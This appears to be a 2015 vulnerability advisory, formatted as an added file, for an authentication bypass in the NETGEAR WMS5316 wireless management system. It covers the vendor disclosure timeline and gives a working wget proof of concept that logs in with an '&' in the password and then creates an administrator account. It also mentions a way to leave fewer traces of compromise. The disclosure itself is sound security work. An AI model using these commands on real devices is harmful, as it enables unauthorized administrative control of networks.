@@ -1,0 +1,105 @@
+NETGEAR Wireless Management System - Authentication Bypass and
+Privilege Escalation.
+WMS5316 ProSafe 16AP Wireless Management System - Firmware 2.1.4.15
+(Build 1236).
+
+
+[-] Vulnerability Information:
+==============================
+Title: NETGEAR Wireless Management System - Authentication Bypass and
+Privilege Escalation
+CVE: Not assigned
+Vendor: NETGEAR
+Product: WMS5316 ProSafe 16AP Wireless Management System
+Affected Version: Firmware 2.1.4.15 (Build 1236)
+Fixed Version: Not publicly available
+
+
+[-] Disclosure Timeline:
+========================
+22/04/2015
+Vulnerability identified by Reinforce Services
+
+23/04/2015
+Support case created with NETGEAR.
+
+24/04/2015
+Vendor requested further information.
+
+27/04/2015
+Issue escalated within NETGEAR.
+
+30/04/2015
+Issue confirmed by vendor.
+
+18/05/2015
+Vendor confirmed issue present in other controllers (details unknown)
+Beta update for WMS5316 expected first week of June.
+
+06/25/2015
+Vendor releases firmware version 2.1.5 that now contains a fix.
+http://downloadcenter.netgear.com/en/product/WMS5316#
+http://kb.netgear.com/app/answers/detail/a_id/29339
+(Note: This has not been tested to confirm the issue is resolved)
+
+
+[-] Proof of Concept:
+=================
+wget --keep-session-cookies --save-cookies=cookies.txt
+--post-data="reqMethod=auth_user&jsonData=%7B%22user_name%22%3A%20%22ANYTHING%22%2C%20%22password%22%3A%20%22&%22%7D"
+http://192.168.1.2/login_handler.php && wget
+--load-cookies=cookies.txt
+--post-data="reqMethod=add_user&jsonData=%7B%22user_name%22%3A%20%22newusername%22%2C%20%22password%22%3A%20%22newpassword%22%2C%20%22re_password%22%3A%20%22newpassword%22%2C%20%22type%22%3A%20%222%22%7D"
+http://192.168.1.2/request_handler.php
+
+
+[-] Vulnerability Details:
+==========================
+The process to bypass authentication and escalate privileges is as follows:
+
+One:
+Include the "&" symbol anywhere in the password value in the login
+request (as raw content - it must not be encoded).
+
+Two:
+After a moment, the system will accept those credentials and grant
+access to the GUI. The account appears somewhat restricted - but this
+is only client side.
+
+Three:
+Send a request to add a new administrative user.
+
+Four:
+The new admin account is then available for use as created above.
+
+Note: As an alternative, it is trivial to modify the Java code on it's
+way down to a browser to enable all of the admin functions rather than
+creating a new user.
+This worked as well - so it's not strictly necessary to create a new
+user; the bypass 'user' has full admin access if needed (leaving less
+indicators of compromise)
+
+
+[-] Credits:
+============
+Vulnerability discovered by Elliott Lewis of Reinforce Services
+
+
+[-] Copyright:
+==============
+Copyright (c) Reinforce Services Limited 2015, All rights reserved
+worldwide. Permission is hereby granted for the electronic
+redistribution of this information. It is not to be edited or altered
+in any way without the express written consent of Reinforce Services
+Limited.
+
+
+[-] Disclaimer:
+===============
+The information herein contained may change without notice. Use of
+this information constitutes acceptance for use in an AS IS condition.
+There are NO warranties, implied or otherwise, with regard to this
+information or its use. Any use of this information is at the user's
+risk. In no event shall the author/distributor (Reinforce Services
+Limited) be held liable for any damages whatsoever arising out of or
+in connection with the use or spread of this information.
